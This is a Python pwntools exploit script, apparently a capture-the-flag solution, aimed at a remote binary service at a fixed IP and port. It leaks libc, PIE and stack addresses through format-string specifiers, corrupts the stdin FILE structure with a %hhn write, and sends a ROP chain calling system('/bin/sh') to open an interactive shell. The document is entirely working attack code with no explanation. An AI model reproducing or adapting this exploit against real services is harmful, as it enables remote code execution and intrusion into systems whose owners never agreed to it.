from pwn import*
p = remote('111.198.29.45',41151)
#context(log_level='DEBUG')
libc = ELF('libc-2.23.so',checksec=False)
def name(name):
	p.sendlineafter('choice','1')
	p.send(name)
def echo(text):
	p.sendlineafter('choice','2')
	p.sendlineafter('length:','7')
	p.send(text)
def leak(content):
	echo(content)
	p.recvuntil('anonymous say:')
	return int(p.recv(14),16)
libc_base = leak('%19$p') - 0xF0 - libc.sym['__libc_start_main']
libc.address = libc_base
pie = leak('%13$p') -0xD08
ret = leak('%12$p') + 8
system = libc.sym['system']
binsh =  libc.search('/bin/sh').next()
pop_rdi_ret = pie + 0xD93
name(p64(libc.sym['_IO_2_1_stdin_'] + 8*7))
echo('%16$hhn')
payload = p64(libc.sym['_IO_2_1_stdin_'] + 0x83)*3 + p64(ret) + p64(ret + 0x18)
p.sendlineafter('choice','2')
p.sendafter('length:',payload)
p.sendline()
for i in range(0,len(payload)-1):
	p.sendlineafter('choice','2')
	p.sendlineafter('length:','0')
payload = p64(pop_rdi_ret) + p64(binsh) + p64(system)
p.sendlineafter('choice','2')
p.sendafter('length:',payload)
p.sendline()
p.sendlineafter('choice','3')
og = [0x45216,0x4526A,0xF02A4,0xF1147]
one_gadget = libc_base + og[3]
p.interactive()
